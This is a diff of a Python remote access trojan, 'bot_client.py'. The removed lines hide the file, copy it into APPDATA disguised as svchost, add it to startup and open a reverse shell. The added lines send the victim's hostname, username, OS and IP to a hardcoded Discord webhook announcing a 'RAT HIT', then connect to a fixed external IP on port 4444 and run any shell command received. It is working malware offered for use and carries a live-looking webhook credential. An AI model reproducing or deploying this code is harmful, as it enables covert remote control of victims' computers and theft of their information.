@@ -1,98 +1,53 @@
-# bot_client.py - Run this on the victim machine
 import socket
 import subprocess
-import os
-import sys
-import shutil
-import ctypes
+import requests
+import platform
+import getpass
 
-# Hide the current file (Windows only)
-if os.name == 'nt':
+def start_client():
+    # Discord Webhook URL - put your webhook here!
+    webhook_url = "https://discord.com/api/webhooks/1404884748232298586/oNAip9LHAohoNjfge5I4GHtDDHhhXQKt97K1qjLxkR8OflX4fJjjykZCU61OCtbmnf-V"
+
+    # Get the system info you want to send
+    hostname = socket.gethostname()
+    username = getpass.getuser()
+    os_info = platform.platform()
+    local_ip = socket.gethostbyname(hostname)
+
+    # Make the message for Discord
+    message = {
+        "content": "INCOMING RAT HIT 🐀🚨\n**Hostname:** " + hostname + "\n**Username:** " + username + "\n**OS:** " + os_info + "\n**Local IP:** " + local_ip
+    }
+
+    # Send the hit to Discord
     try:
-        ctypes.windll.kernel32.SetFileAttributesW(os.path.abspath(sys.argv[0]), 2)  # 2 = hidden
-    except Exception:
-        pass
-
-def move_to_appdata():
-    if os.name != 'nt':
-        return
-    appdata = os.environ["APPDATA"]
-    dest_dir = os.path.join(appdata, "Microsoft", "Windows")
-    dest_path = os.path.join(dest_dir, "svchost.py")
-    current_path = os.path.abspath(sys.argv[0])
-
-    # If already in destination, do nothing
-    if current_path == dest_path:
-        return
-
-    # Common user folders to check
-    user_profile = os.environ["USERPROFILE"]
-    search_dirs = [
-        os.path.join(user_profile, "Desktop"),
-        os.path.join(user_profile, "Downloads"),
-        os.path.join(user_profile, "Pictures"),
-        os.path.join(user_profile, "Documents"),
-        os.path.join(user_profile, "Videos"),
-        os.path.join(user_profile, "Music"),
-    ]
-
-    # If current path is in one of these folders, move it
-    for folder in search_dirs:
-        if current_path.lower().startswith(folder.lower()):
-            if not os.path.exists(dest_dir):
-                os.makedirs(dest_dir)
-            shutil.copy2(current_path, dest_path)
-            # Hide the file
-            ctypes.windll.kernel32.SetFileAttributesW(dest_path, 2)
-            os.startfile(dest_path)
-            sys.exit()
-    # If not in those folders, just continue
-
-move_to_appdata()
-
-def add_to_startup():
-    if os.name != 'nt':
-        return
-    try:
-        import win32com.client
-        startup_dir = os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup")
-        exe_path = os.path.abspath(sys.argv[0])
-        shortcut_path = os.path.join(startup_dir, "svchost.lnk")
-
-        shell = win32com.client.Dispatch("WScript.Shell")
-        shortcut = shell.CreateShortCut(shortcut_path)
-        shortcut.Targetpath = exe_path
-        shortcut.WorkingDirectory = os.path.dirname(exe_path)
-        shortcut.IconLocation = exe_path
-        shortcut.save()
+        requests.post(webhook_url, json=message)
     except Exception as e:
+        # If it fails, who cares? The main program will still run.
         pass
 
-add_to_startup()
+    # Your original connection code is still here, after the webhook is sent
+    host = '162.120.187.61'
+    port = 4444
 
-# Hide the console window (Windows only)
-if os.name == 'nt':
-    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
-
-SERVER_IP = '192.168.1.68'  # Replace with your C2 server IP
-SERVER_PORT = 4444
-
-client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-client.connect((SERVER_IP, SERVER_PORT))
-
-while True:
-    command = client.recv(1024).decode()
-    if command.lower() == 'exit':
-        break
-
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
-        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
-    except subprocess.CalledProcessError as e:
-        output = e.output
+        client.connect((host, port))
+    except Exception as e:
+        return
 
-    if not output:
-        output = b'Command executed.\n'
+    while True:
+        command = client.recv(1024).decode()
+        if command == 'exit':
+            break
 
-    client.send(output)
+        try:
+            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
+            client.send(output)
+        except Exception as e:
+            client.send(str(e).encode())
 
-client.close()
+    client.close()
+
+if __name__ == "__main__":
+    start_client()
